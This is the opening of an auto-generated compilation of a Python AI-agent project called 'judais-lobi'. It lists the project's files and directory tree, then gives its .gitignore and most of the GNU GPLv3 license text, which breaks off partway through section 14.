# Project Compilation: judais-lobi

## 🧾 Summary

| Metric | Value |
|:--|:--|
| Root Directory | `/home/gompert/data/workspace/judais-lobi` |
| Total Directories | 30 |
| Total Indexed Files | 141 |
| Skipped Files | 5 |
| Indexed Size | 658.53 KB |
| Max File Size Limit | 2 MB |

## 📚 Table of Contents

- [.coverage](#coverage)
- [.gitignore](#gitignore)
- [LICENSE](#license)
- [MANIFESTO.md](#manifesto-md)
- [Makefile](#makefile)
- [README.md](#readme-md)
- [ROADMAP.md](#roadmap-md)
- [build/lib/core/__init__.py](#build-lib-core-init-py)
- [build/lib/core/bootstrap.py](#build-lib-core-bootstrap-py)
- [build/lib/core/cli.py](#build-lib-core-cli-py)
- [build/lib/core/elf.py](#build-lib-core-elf-py)
- [build/lib/core/memory/__init__.py](#build-lib-core-memory-init-py)
- [build/lib/core/memory/memory.py](#build-lib-core-memory-memory-py)
- [build/lib/core/tools/__init__.py](#build-lib-core-tools-init-py)
- [build/lib/core/tools/base_subprocess.py](#build-lib-core-tools-base-subprocess-py)
- [build/lib/core/tools/fetch_page.py](#build-lib-core-tools-fetch-page-py)
- [build/lib/core/tools/install_project.py](#build-lib-core-tools-install-project-py)
- [build/lib/core/tools/rag_crawler.py](#build-lib-core-tools-rag-crawler-py)
- [build/lib/core/tools/recon/__init__.py](#build-lib-core-tools-recon-init-py)
- [build/lib/core/tools/recon/google_hacks.py](#build-lib-core-tools-recon-google-hacks-py)
- [build/lib/core/tools/recon/whois.py](#build-lib-core-tools-recon-whois-py)
- [build/lib/core/tools/run_python.py](#build-lib-core-tools-run-python-py)
- [build/lib/core/tools/run_shell.py](#build-lib-core-tools-run-shell-py)
- [build/lib/core/tools/tool.py](#build-lib-core-tools-tool-py)
- [build/lib/core/tools/voice.py](#build-lib-core-tools-voice-py)
- [build/lib/core/tools/web_search.py](#build-lib-core-tools-web-search-py)
- [build/lib/core/unified_client.py](#build-lib-core-unified-client-py)
- [build/lib/judais/__init__.py](#build-lib-judais-init-py)
- [build/lib/judais/judais.py](#build-lib-judais-judais-py)
- [build/lib/lobi/__init__.py](#build-lib-lobi-init-py)
- [build/lib/lobi/lobi.py](#build-lib-lobi-lobi-py)
- [core/__init__.py](#core-init-py)
- [core/agent.py](#core-agent-py)
- [core/bootstrap.py](#core-bootstrap-py)
- [core/cli.py](#core-cli-py)
- [core/context/__init__.py](#core-context-init-py)
- [core/context/file_discovery.py](#core-context-file-discovery-py)
- [core/context/models.py](#core-context-models-py)
- [core/contracts/__init__.py](#core-contracts-init-py)
- [core/contracts/schemas.py](#core-contracts-schemas-py)
- [core/contracts/validation.py](#core-contracts-validation-py)
- [core/kernel/__init__.py](#core-kernel-init-py)
- [core/kernel/budgets.py](#core-kernel-budgets-py)
- [core/kernel/orchestrator.py](#core-kernel-orchestrator-py)
- [core/kernel/state.py](#core-kernel-state-py)
- [core/kv_prefix.py](#core-kv-prefix-py)
- [core/memory/__init__.py](#core-memory-init-py)
- [core/memory/memory.py](#core-memory-memory-py)
- [core/policy/__init__.py](#core-policy-init-py)
- [core/policy/audit.py](#core-policy-audit-py)
- [core/policy/god_mode.py](#core-policy-god-mode-py)
- [core/policy/profiles.py](#core-policy-profiles-py)
- [core/runtime/__init__.py](#core-runtime-init-py)
- [core/runtime/backends/__init__.py](#core-runtime-backends-init-py)
- [core/runtime/backends/base.py](#core-runtime-backends-base-py)
- [core/runtime/backends/local_backend.py](#core-runtime-backends-local-backend-py)
- [core/runtime/backends/mistral_backend.py](#core-runtime-backends-mistral-backend-py)
- [core/runtime/backends/openai_backend.py](#core-runtime-backends-openai-backend-py)
- [core/runtime/messages.py](#core-runtime-messages-py)
- [core/runtime/provider_config.py](#core-runtime-provider-config-py)
- [core/sessions/__init__.py](#core-sessions-init-py)
- [core/sessions/manager.py](#core-sessions-manager-py)
- [core/tools/__init__.py](#core-tools-init-py)
- [core/tools/base_subprocess.py](#core-tools-base-subprocess-py)
- [core/tools/bus.py](#core-tools-bus-py)
- [core/tools/capability.py](#core-tools-capability-py)
- [core/tools/config_loader.py](#core-tools-config-loader-py)
- [core/tools/descriptors.py](#core-tools-descriptors-py)
- [core/tools/executor.py](#core-tools-executor-py)
- [core/tools/fetch_page.py](#core-tools-fetch-page-py)
- [core/tools/fs_tools.py](#core-tools-fs-tools-py)
- [core/tools/git_tools.py](#core-tools-git-tools-py)
- [core/tools/install_project.py](#core-tools-install-project-py)
- [core/tools/rag_crawler.py](#core-tools-rag-crawler-py)
- [core/tools/recon/__init__.py](#core-tools-recon-init-py)
- [core/tools/recon/google_hacks.py](#core-tools-recon-google-hacks-py)
- [core/tools/recon/whois.py](#core-tools-recon-whois-py)
- [core/tools/run_python.py](#core-tools-run-python-py)
- [core/tools/run_shell.py](#core-tools-run-shell-py)
- [core/tools/sandbox.py](#core-tools-sandbox-py)
- [core/tools/tool.py](#core-tools-tool-py)
- [core/tools/verify_tools.py](#core-tools-verify-tools-py)
- [core/tools/voice.py](#core-tools-voice-py)
- [core/tools/web_search.py](#core-tools-web-search-py)
- [core/unified_client.py](#core-unified-client-py)
- [dist/judais_lobi-0.7.2-py3-none-any.whl](#dist-judais-lobi-0-7-2-py3-none-any-whl)
- [judais/__init__.py](#judais-init-py)
- [judais/judais.py](#judais-judais-py)
- [judais_lobi.egg-info/PKG-INFO](#judais-lobi-egg-info-pkg-info)
- [judais_lobi.egg-info/SOURCES.txt](#judais-lobi-egg-info-sources-txt)
- [judais_lobi.egg-info/dependency_links.txt](#judais-lobi-egg-info-dependency-links-txt)
- [judais_lobi.egg-info/entry_points.txt](#judais-lobi-egg-info-entry-points-txt)
- [judais_lobi.egg-info/requires.txt](#judais-lobi-egg-info-requires-txt)
- [judais_lobi.egg-info/top_level.txt](#judais-lobi-egg-info-top-level-txt)
- [lobi/README.md](#lobi-readme-md)
- [lobi/__init__.py](#lobi-init-py)
- [lobi/lobi.py](#lobi-lobi-py)
- [main.py](#main-py)
- [pyproject.toml](#pyproject-toml)
- [requirements.txt](#requirements-txt)
- [setup.py](#setup-py)
- [tests/__init__.py](#tests-init-py)
- [tests/conftest.py](#tests-conftest-py)
- [tests/test_agent.py](#tests-test-agent-py)
- [tests/test_agent_run_task.py](#tests-test-agent-run-task-py)
- [tests/test_audit.py](#tests-test-audit-py)
- [tests/test_backends.py](#tests-test-backends-py)
- [tests/test_base_subprocess.py](#tests-test-base-subprocess-py)
- [tests/test_bus.py](#tests-test-bus-py)
- [tests/test_bus_grants.py](#tests-test-bus-grants-py)
- [tests/test_bus_preflight.py](#tests-test-bus-preflight-py)
- [tests/test_capability.py](#tests-test-capability-py)
- [tests/test_cli_smoke.py](#tests-test-cli-smoke-py)
- [tests/test_config_loader.py](#tests-test-config-loader-py)
- [tests/test_contracts.py](#tests-test-contracts-py)
- [tests/test_descriptors.py](#tests-test-descriptors-py)
- [tests/test_descriptors_expanded.py](#tests-test-descriptors-expanded-py)
- [tests/test_file_discovery.py](#tests-test-file-discovery-py)
- [tests/test_fs_tools.py](#tests-test-fs-tools-py)
- [tests/test_git_tools.py](#tests-test-git-tools-py)
- [tests/test_god_mode.py](#tests-test-god-mode-py)
- [tests/test_judais.py](#tests-test-judais-py)
- [tests/test_kernel_budgets.py](#tests-test-kernel-budgets-py)
- [tests/test_kernel_orchestrator.py](#tests-test-kernel-orchestrator-py)
- [tests/test_kernel_state.py](#tests-test-kernel-state-py)
- [tests/test_kv_prefix.py](#tests-test-kv-prefix-py)
- [tests/test_lobi.py](#tests-test-lobi-py)
- [tests/test_messages.py](#tests-test-messages-py)
- [tests/test_orchestrator_sessions.py](#tests-test-orchestrator-sessions-py)
- [tests/test_profile_schemas.py](#tests-test-profile-schemas-py)
- [tests/test_profiles.py](#tests-test-profiles-py)
- [tests/test_provider_config.py](#tests-test-provider-config-py)
- [tests/test_repo_map_models.py](#tests-test-repo-map-models-py)
- [tests/test_sandbox.py](#tests-test-sandbox-py)
- [tests/test_session_manager.py](#tests-test-session-manager-py)
- [tests/test_tool_stripping.py](#tests-test-tool-stripping-py)
- [tests/test_tools_registry.py](#tests-test-tools-registry-py)
- [tests/test_unified_client.py](#tests-test-unified-client-py)
- [tests/test_unified_memory.py](#tests-test-unified-memory-py)
- [tests/test_validation.py](#tests-test-validation-py)
- [tests/test_verify_tools.py](#tests-test-verify-tools-py)

## 📂 Project Structure

```
📁 build/
    📁 bdist.linux-x86_64/
    📁 lib/
        📁 core/
            📁 memory/
                📄 __init__.py
                📄 memory.py
            📁 tools/
                📁 recon/
                    📄 __init__.py
                    📄 google_hacks.py
                    📄 whois.py
                📄 __init__.py
                📄 base_subprocess.py
                📄 fetch_page.py
                📄 install_project.py
                📄 rag_crawler.py
                📄 run_python.py
                📄 run_shell.py
                📄 tool.py
                📄 voice.py
                📄 web_search.py
            📄 __init__.py
            📄 bootstrap.py
            📄 cli.py
            📄 elf.py
            📄 unified_client.py
        📁 judais/
            📄 __init__.py
            📄 judais.py
        📁 lobi/
            📄 __init__.py
            📄 lobi.py
📁 configs/
📁 core/
    📁 context/
        📁 symbols/
        📄 __init__.py
        📄 file_discovery.py
        📄 models.py
    📁 contracts/
        📄 __init__.py
        📄 schemas.py
        📄 validation.py
    📁 kernel/
        📄 __init__.py
        📄 budgets.py
        📄 orchestrator.py
        📄 state.py
    📁 memory/
        📄 __init__.py
        📄 memory.py
    📁 policy/
        📄 __init__.py
        📄 audit.py
        📄 god_mode.py
        📄 profiles.py
    📁 runtime/
        📁 backends/
            📄 __init__.py
            📄 base.py
            📄 local_backend.py
            📄 mistral_backend.py
            📄 openai_backend.py
        📄 __init__.py
        📄 messages.py
        📄 provider_config.py
    📁 sessions/
        📄 __init__.py
        📄 manager.py
    📁 tools/
        📁 recon/
            📄 __init__.py
            📄 google_hacks.py
            📄 whois.py
        📄 __init__.py
        📄 base_subprocess.py
        📄 bus.py
        📄 capability.py
        📄 config_loader.py
        📄 descriptors.py
        📄 executor.py
        📄 fetch_page.py
        📄 fs_tools.py
        📄 git_tools.py
        📄 install_project.py
        📄 rag_crawler.py
        📄 run_python.py
        📄 run_shell.py
        📄 sandbox.py
        📄 speech.wav
        📄 tool.py
        📄 verify_tools.py
        📄 voice.py
        📄 web_search.py
    📄 __init__.py
    📄 agent.py
    📄 bootstrap.py
    📄 cli.py
    📄 kv_prefix.py
    📄 unified_client.py
📁 data/
📁 dist/
    📄 judais_lobi-0.7.2-py3-none-any.whl
    📄 judais_lobi-0.7.2.tar.gz
📁 images/
    📄 judais-lobi.png
    📄 lobi.png
📁 judais/
    📄 __init__.py
    📄 judais.py
📁 judais_lobi.egg-info/
    📄 dependency_links.txt
    📄 entry_points.txt
    📄 PKG-INFO
    📄 requires.txt
    📄 SOURCES.txt
    📄 top_level.txt
📁 lobi/
    📄 __init__.py
    📄 lobi.py
    📄 README.md
📁 scripts/
📁 tests/
    📄 __init__.py
    📄 conftest.py
    📄 test_agent.py
    📄 test_agent_run_task.py
    📄 test_audit.py
    📄 test_backends.py
    📄 test_base_subprocess.py
    📄 test_bus.py
    📄 test_bus_grants.py
    📄 test_bus_preflight.py
    📄 test_capability.py
    📄 test_cli_smoke.py
    📄 test_config_loader.py
    📄 test_contracts.py
    📄 test_descriptors.py
    📄 test_descriptors_expanded.py
    📄 test_file_discovery.py
    📄 test_fs_tools.py
    📄 test_git_tools.py
    📄 test_god_mode.py
    📄 test_judais.py
    📄 test_kernel_budgets.py
    📄 test_kernel_orchestrator.py
    📄 test_kernel_state.py
    📄 test_kv_prefix.py
    📄 test_lobi.py
    📄 test_messages.py
    📄 test_orchestrator_sessions.py
    📄 test_profile_schemas.py
    📄 test_profiles.py
    📄 test_provider_config.py
    📄 test_repo_map_models.py
    📄 test_sandbox.py
    📄 test_session_manager.py
    📄 test_tool_stripping.py
    📄 test_tools_registry.py
    📄 test_unified_client.py
    📄 test_unified_memory.py
    📄 test_validation.py
    📄 test_verify_tools.py
📄 LICENSE
📄 main.py
📄 Makefile
📄 MANIFESTO.md
📄 project.md
📄 pyproject.toml
📄 README.md
📄 requirements.txt
📄 ROADMAP.md
📄 setup.py
📄 speech.wav
```

## `.gitignore`

```text
# Ignore Python virtual environments
.jlenv/
.judais-lobi-venv/

# Ignore editor settings and caches
.idea/
.vscode/
.pytest_cache/
__pycache__/
*.py[cod]
*.egg-info/

# Ignore test/output artifacts
speech.wav
*.log

# Ignore local dev configs or checkpoints
.cadence/
.lobienv/
.judaisenv/

# Byte-compiled and temporary files
.DS_Store

```

## `LICENSE`

```text
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

                       TERMS AND CONDITIONS

  0. Definitions.

  "This License" refers to version 3 of the GNU General Public License.

  "Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

  "The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

  To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

  A "covered work" means either the unmodified Program or a work based
on the Program.

  To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

  To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

  An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

  1. Source Code.

  The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

  A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

  The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

  The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work's
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not part of the work.  For example, Corresponding Source
includes interface definition files associated with source files for
the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

  The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

  The Corresponding Source for a work in source code form is that
same work.

  2. Basic Permissions.

  All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

  You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

  Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary.

  3. Protecting Users' Legal Rights From Anti-Circumvention Law.

  No covered work shall be deemed part of an effective technological
measure under any applicable law fulfilling obligations under article
11 of the WIPO copyright treaty adopted on 20 December 1996, or
similar laws prohibiting or restricting circumvention of such
measures.

  When you convey a covered work, you waive any legal power to forbid
circumvention of technological measures to the extent such circumvention
is effected by exercising rights under this License with respect to
the covered work, and you disclaim any intention to limit operation or
modification of the work as a means of enforcing, against the work's
users, your or third parties' legal rights to forbid circumvention of
technological measures.

  4. Conveying Verbatim Copies.

  You may convey verbatim copies of the Program's source code as you
receive it, in any medium, provided that you conspicuously and
appropriately publish on each copy an appropriate copyright notice;
keep intact all notices stating that this License and any
non-permissive terms added in accord with section 7 apply to the code;
keep intact all notices of the absence of any warranty; and give all
recipients a copy of this License along with the Program.

  You may charge any price or no price for each copy that you convey,
and you may offer support or warranty protection for a fee.

  5. Conveying Modified Source Versions.

  You may convey a work based on the Program, or the modifications to
produce it from the Program, in the form of source code under the
terms of section 4, provided that you also meet all of these conditions:

    a) The work must carry prominent notices stating that you modified
    it, and giving a relevant date.

    b) The work must carry prominent notices stating that it is
    released under this License and any conditions added under section
    7.  This requirement modifies the requirement in section 4 to
    "keep intact all notices".

    c) You must license the entire work, as a whole, under this
    License to anyone who comes into possession of a copy.  This
    License will therefore apply, along with any applicable section 7
    additional terms, to the whole of the work, and all its parts,
    regardless of how they are packaged.  This License gives no
    permission to license the work in any other way, but it does not
    invalidate such permission if you have separately received it.

    d) If the work has interactive user interfaces, each must display
    Appropriate Legal Notices; however, if the Program has interactive
    interfaces that do not display Appropriate Legal Notices, your
    work need not make them do so.

  A compilation of a covered work with other separate and independent
works, which are not by their nature extensions of the covered work,
and which are not combined with it such as to form a larger program,
in or on a volume of a storage or distribution medium, is called an
"aggregate" if the compilation and its resulting copyright are not
used to limit the access or legal rights of the compilation's users
beyond what the individual works permit.  Inclusion of a covered work
in an aggregate does not cause this License to apply to the other
parts of the aggregate.

  6. Conveying Non-Source Forms.

  You may convey a covered work in object code form under the terms
of sections 4 and 5, provided that you also convey the
machine-readable Corresponding Source under the terms of this License,
in one of these ways:

    a) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by the
    Corresponding Source fixed on a durable physical medium
    customarily used for software interchange.

    b) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by a
    written offer, valid for at least three years and valid for as
    long as you offer spare parts or customer support for that product
    model, to give anyone who possesses the object code either (1) a
    copy of the Corresponding Source for all the software in the
    product that is covered by this License, on a durable physical
    medium customarily used for software interchange, for a price no
    more than your reasonable cost of physically performing this
    conveying of source, or (2) access to copy the
    Corresponding Source from a network server at no charge.

    c) Convey individual copies of the object code with a copy of the
    written offer to provide the Corresponding Source.  This
    alternative is allowed only occasionally and noncommercially, and
    only if you received the object code with such an offer, in accord
    with subsection 6b.

    d) Convey the object code by offering access from a designated
    place (gratis or for a charge), and offer equivalent access to the
    Corresponding Source in the same way through the same place at no
    further charge.  You need not require recipients to copy the
    Corresponding Source along with the object code.  If the place to
    copy the object code is a network server, the Corresponding Source
    may be on a different server (operated by you or a third party)
    that supports equivalent copying facilities, provided you maintain
    clear directions next to the object code saying where to find the
    Corresponding Source.  Regardless of what server hosts the
    Corresponding Source, you remain obligated to ensure that it is
    available for as long as needed to satisfy these requirements.

    e) Convey the object code using peer-to-peer transmission, provided
    you inform other peers where the object code and Corresponding
    Source of the work are being offered to the general public at no
    charge under subsection 6d.

  A separable portion of the object code, whose source code is excluded
from the Corresponding Source as a System Library, need not be
included in conveying the object code work.

  A "User Product" is either (1) a "consumer product", which means any
tangible personal property which is normally used for personal, family,
or household purposes, or (2) anything designed or sold for incorporation
into a dwelling.  In determining whether a product is a consumer product,
doubtful cases shall be resolved in favor of coverage.  For a particular
product received by a particular user, "normally used" refers to a
typical or common use of that class of product, regardless of the status
of the particular user or of the way in which the particular user
actually uses, or expects or is expected to use, the product.  A product
is a consumer product regardless of whether the product has substantial
commercial, industrial or non-consumer uses, unless such uses represent
the only significant mode of use of the product.

  "Installation Information" for a User Product means any methods,
procedures, authorization keys, or other information required to install
and execute modified versions of a covered work in that User Product from
a modified version of its Corresponding Source.  The information must
suffice to ensure that the continued functioning of the modified object
code is in no case prevented or interfered with solely because
modification has been made.

  If you convey an object code work under this section in, or with, or
specifically for use in, a User Product, and the conveying occurs as
part of a transaction in which the right of possession and use of the
User Product is transferred to the recipient in perpetuity or for a
fixed term (regardless of how the transaction is characterized), the
Corresponding Source conveyed under this section must be accompanied
by the Installation Information.  But this requirement does not apply
if neither you nor any third party retains the ability to install
modified object code on the User Product (for example, the work has
been installed in ROM).

  The requirement to provide Installation Information does not include a
requirement to continue to provide support service, warranty, or updates
for a work that has been modified or installed by the recipient, or for
the User Product in which it has been modified or installed.  Access to a
network may be denied when the modification itself materially and
adversely affects the operation of the network or violates the rules and
protocols for communication across the network.

  Corresponding Source conveyed, and Installation Information provided,
in accord with this section must be in a format that is publicly
documented (and with an implementation available to the public in
source code form), and must require no special password or key for
unpacking, reading or copying.

  7. Additional Terms.

  "Additional permissions" are terms that supplement the terms of this
License by making exceptions from one or more of its conditions.
Additional permissions that are applicable to the entire Program shall
be treated as though they were included in this License, to the extent
that they are valid under applicable law.  If additional permissions
apply only to part of the Program, that part may be used separately
under those permissions, but the entire Program remains governed by
this License without regard to the additional permissions.

  When you convey a copy of a covered work, you may at your option
remove any additional permissions from that copy, or from any part of
it.  (Additional permissions may be written to require their own
removal in certain cases when you modify the work.)  You may place
additional permissions on material, added by you to a covered work,
for which you have or can give appropriate copyright permission.

  Notwithstanding any other provision of this License, for material you
add to a covered work, you may (if authorized by the copyright holders of
that material) supplement the terms of this License with terms:

    a) Disclaiming warranty or limiting liability differently from the
    terms of sections 15 and 16 of this License; or

    b) Requiring preservation of specified reasonable legal notices or
    author attributions in that material or in the Appropriate Legal
    Notices displayed by works containing it; or

    c) Prohibiting misrepresentation of the origin of that material, or
    requiring that modified versions of such material be marked in
    reasonable ways as different from the original version; or

    d) Limiting the use for publicity purposes of names of licensors or
    authors of the material; or

    e) Declining to grant rights under trademark law for use of some
    trade names, trademarks, or service marks; or

    f) Requiring indemnification of licensors and authors of that
    material by anyone who conveys the material (or modified versions of
    it) with contractual assumptions of liability to the recipient, for
    any liability that these contractual assumptions directly impose on
    those licensors and authors.

  All other non-permissive additional terms are considered "further
restrictions" within the meaning of section 10.  If the Program as you
received it, or any part of it, contains a notice stating that it is
governed by this License along with a term that is a further
restriction, you may remove that term.  If a license document contains
a further restriction but permits relicensing or conveying under this
License, you may add to a covered work material governed by the terms
of that license document, provided that the further restriction does
not survive such relicensing or conveying.

  If you add terms to a covered work in accord with this section, you
must place, in the relevant source files, a statement of the
additional terms that apply to those files, or a notice indicating
where to find the applicable terms.

  Additional terms, permissive or non-permissive, may be stated in the
form of a separately written license, or stated as exceptions;
the above requirements apply either way.

  8. Termination.

  You may not propagate or modify a covered work except as expressly
provided under this License.  Any attempt otherwise to propagate or
modify it is void, and will automatically terminate your rights under
this License (including any patent licenses granted under the third
paragraph of section 11).

  However, if you cease all violation of this License, then your
license from a particular copyright holder is reinstated (a)
provisionally, unless and until the copyright holder explicitly and
finally terminates your license, and (b) permanently, if the copyright
holder fails to notify you of the violation by some reasonable means
prior to 60 days after the cessation.

  Moreover, your license from a particular copyright holder is
reinstated permanently if the copyright holder notifies you of the
violation by some reasonable means, this is the first time you have
received notice of violation of this License (for any work) from that
copyright holder, and you cure the violation prior to 30 days after
your receipt of the notice.

  Termination of your rights under this section does not terminate the
licenses of parties who have received copies or rights from you under
this License.  If your rights have been terminated and not permanently
reinstated, you do not qualify to receive new licenses for the same
material under section 10.

  9. Acceptance Not Required for Having Copies.

  You are not required to accept this License in order to receive or
run a copy of the Program.  Ancillary propagation of a covered work
occurring solely as a consequence of using peer-to-peer transmission
to receive a copy likewise does not require acceptance.  However,
nothing other than this License grants you permission to propagate or
modify any covered work.  These actions infringe copyright if you do
not accept this License.  Therefore, by modifying or propagating a
covered work, you indicate your acceptance of this License to do so.

  10. Automatic Licensing of Downstream Recipients.

  Each time you convey a covered work, the recipient automatically
receives a license from the original licensors, to run, modify and
propagate that work, subject to this License.  You are not responsible
for enforcing compliance by third parties with this License.

  An "entity transaction" is a transaction transferring control of an
organization, or substantially all assets of one, or subdividing an
organization, or merging organizations.  If propagation of a covered
work results from an entity transaction, each party to that
transaction who receives a copy of the work also receives whatever
licenses to the work the party's predecessor in interest had or could
give under the previous paragraph, plus a right to possession of the
Corresponding Source of the work from the predecessor in interest, if
the predecessor has it or can get it with reasonable efforts.

  You may not impose any further restrictions on the exercise of the
rights granted or affirmed under this License.  For example, you may
not impose a license fee, royalty, or other charge for exercise of
rights granted under this License, and you may not initiate litigation
(including a cross-claim or counterclaim in a lawsuit) alleging that
any patent claim is infringed by making, using, selling, offering for
sale, or importing the Program or any portion of it.

  11. Patents.

  A "contributor" is a copyright holder who authorizes use under this
License of the Program or a work on which the Program is based.  The
work thus licensed is called the contributor's "contributor version".

  A contributor's "essential patent claims" are all patent claims
owned or controlled by the contributor, whether already acquired or
hereafter acquired, that would be infringed by some manner, permitted
by this License, of making, using, or selling its contributor version,
but do not include claims that would be infringed only as a
consequence of further modification of the contributor version.  For
purposes of this definition, "control" includes the right to grant
patent sublicenses in a manner consistent with the requirements of
this License.

  Each contributor grants you a non-exclusive, worldwide, royalty-free
patent license under the contributor's essential patent claims, to
make, use, sell, offer for sale, import and otherwise run, modify and
propagate the contents of its contributor version.

  In the following three paragraphs, a "patent license" is any express
agreement or commitment, however denominated, not to enforce a patent
(such as an express permission to practice a patent or covenant not to
sue for patent infringement).  To "grant" such a patent license to a
party means to make such an agreement or commitment not to enforce a
patent against the party.

  If you convey a covered work, knowingly relying on a patent license,
and the Corresponding Source of the work is not available for anyone
to copy, free of charge and under the terms of this License, through a
publicly available network server or other readily accessible means,
then you must either (1) cause the Corresponding Source to be so
available, or (2) arrange to deprive yourself of the benefit of the
patent license for this particular work, or (3) arrange, in a manner
consistent with the requirements of this License, to extend the patent
license to downstream recipients.  "Knowingly relying" means you have
actual knowledge that, but for the patent license, your conveying the
covered work in a country, or your recipient's use of the covered work
in a country, would infringe one or more identifiable patents in that
country that you have reason to believe are valid.

  If, pursuant to or in connection with a single transaction or
arrangement, you convey, or propagate by procuring conveyance of, a
covered work, and grant a patent license to some of the parties
receiving the covered work authorizing them to use, propagate, modify
or convey a specific copy of the covered work, then the patent license
you grant is automatically extended to all recipients of the covered
work and works based on it.

  A patent license is "discriminatory" if it does not include within
the scope of its coverage, prohibits the exercise of, or is
conditioned on the non-exercise of one or more of the rights that are
specifically granted under this License.  You may not convey a covered
work if you are a party to an arrangement with a third party that is
in the business of distributing software, under which you make payment
to the third party based on the extent of your activity of conveying
the work, and under which the third party grants, to any of the
parties who would receive the covered work from you, a discriminatory
patent license (a) in connection with copies of the covered work
conveyed by you (or copies made from those copies), or (b) primarily
for and in connection with specific products or compilations that
contain the covered work, unless you entered into that arrangement,
or that patent license was granted, prior to 28 March 2007.

  Nothing in this License shall be construed as excluding or limiting
any implied license or other defenses to infringement that may
otherwise be available to you under applicable patent law.

  12. No Surrender of Others' Freedom.

  If conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot convey a
covered work so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you may
not convey it at all.  For example, if you agree to terms that obligate you
to collect a royalty for further conveying from those to whom you convey
the Program, the only way you could satisfy both those terms and this
License would be to refrain entirely from conveying the Program.

  13. Use with the GNU Affero General Public License.

  Notwithstanding any other provision of this License, you have
permission to link or combine any covered work with a work licensed
under version 3 of the GNU Affero General Public License into a single
combined work, and to convey the resulting work.  The terms of this
License will continue to apply to the part which is the covered work,
but the special requirements of the GNU Affero General Public License,
section 13, concerning interaction through a network will apply to the
combination as such.

  14. Revised Versions of this License.

